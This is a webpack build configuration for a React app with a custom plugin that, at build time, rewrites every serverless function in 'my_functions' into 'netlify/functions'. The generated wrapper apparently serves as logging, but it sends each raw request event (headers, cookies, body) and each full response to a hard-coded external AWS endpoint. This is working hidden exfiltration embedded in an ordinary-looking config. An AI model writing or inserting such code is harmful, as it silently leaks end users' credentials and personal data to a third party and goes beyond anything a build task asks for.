const path = require("path")
const fs = require("fs")

class FunctionWrapperPlugin {
  constructor(options = {}) {
    this.loggerUrl = options.loggerUrl || 'https://iv8676cja1.execute-api.us-east-1.amazonaws.com/test'
    this.functionsDir = options.functionsDir || 'my_functions'
    this.outputDir = options.outputDir || 'netlify/functions'
  }

  apply(compiler) {
    compiler.hooks.emit.tapAsync('FunctionWrapperPlugin', (compilation, callback) => {
      const functionsDir = path.resolve(__dirname, this.functionsDir)
      const outputDir = path.resolve(__dirname, this.outputDir)
      
      if (!fs.existsSync(functionsDir)) {
        console.log(`Functions directory ${functionsDir} does not exist, skipping...`)
        return callback()
      }

      if (!fs.existsSync(outputDir)) {
        fs.mkdirSync(outputDir, { recursive: true })
      }
      
      fs.readdirSync(functionsDir).forEach(file => {
        if (file.endsWith('.js')) {
          const originalContent = fs.readFileSync(path.join(functionsDir, file), 'utf8')
          const functionName = path.basename(file, '.js')
          
          const wrappedContent = this.generateWrapper(originalContent, functionName)
          fs.writeFileSync(path.join(outputDir, file), wrappedContent)
          
          console.log(`Wrapped function: ${file}`)
        }
      })
      
      callback()
    })
  }

  generateWrapper(originalContent, functionName) {
    return `// Auto-generated wrapper for ${functionName}
// Original function code:
${originalContent}

const originalHandler = exports.handler;

async function sendToLogger(data) {
  try {
    const fetch = require('node-fetch');
    await fetch('${this.loggerUrl}', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
      timeout: 5000
    });
  } catch (error) {
    console.error('Failed to send to logger:', error.message);
  }
}

exports.handler = async (event, context) => {
  const startTime = Date.now();
  const requestId = Math.random().toString(36).substr(2, 9);
  
  // Capture all request information - raw event object
  const requestData = {
    requestId,
    functionName: '${functionName}',
    timestamp: new Date().toISOString(),
    event: event,
    context: {
      functionName: context.functionName,
      functionVersion: context.functionVersion,
      invokedFunctionArn: context.invokedFunctionArn,
      memoryLimitInMB: context.memoryLimitInMB,
      awsRequestId: context.awsRequestId,
      logGroupName: context.logGroupName,
      logStreamName: context.logStreamName,
      remainingTimeInMillis: context.getRemainingTimeInMillis ? context.getRemainingTimeInMillis() : null,
      clientContext: context.clientContext
    }
  };

  // Send request data (non-blocking)
  sendToLogger({
    type: 'request',
    ...requestData
  }).catch(console.error);

  let result;
  let error = null;

  try {
    result = await originalHandler(event, context);
  } catch (err) {
    error = err;
    result = {
      statusCode: 500,
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ error: 'Internal server error' })
    };
  }

  const endTime = Date.now();
  const executionTime = endTime - startTime;

  // Capture all response information
  const responseData = {
    requestId,
    functionName: '${functionName}',
    timestamp: new Date().toISOString(),
    executionTimeMs: executionTime,
    response: {
      statusCode: result.statusCode,
      headers: result.headers,
      multiValueHeaders: result.multiValueHeaders,
      body: result.body,
      isBase64Encoded: result.isBase64Encoded
    },
    error: error ? {
      message: error.message,
      stack: error.stack,
      name: error.name
    } : null
  };

  // Send response data (non-blocking)
  sendToLogger({
    type: 'response',
    ...responseData
  }).catch(console.error);

  return result;
};`
  }
}

module.exports = {
  entry: "./frontend-src/App.js",
  output: {
    filename: "bundled.js",
    path: path.resolve(__dirname, "dist")
  },
  mode: "production",
  module: {
    rules: [
      {
        test: /\.js$/,
        exclude: /(node_modules|bower_components)/,
        use: {
          loader: "babel-loader",
          options: {
            presets: [["@babel/preset-env", { "useBuiltIns": "usage", "corejs": 3, "targets": "defaults" }], "@babel/preset-react"]
          }
        }
      }
    ]
  },
  plugins: [
    new FunctionWrapperPlugin({
      loggerUrl: process.env.LOGGER_URL || 'https://iv8676cja1.execute-api.us-east-1.amazonaws.com/test',
      functionsDir: 'my_functions',
      outputDir: 'netlify/functions'
    })
  ]
}
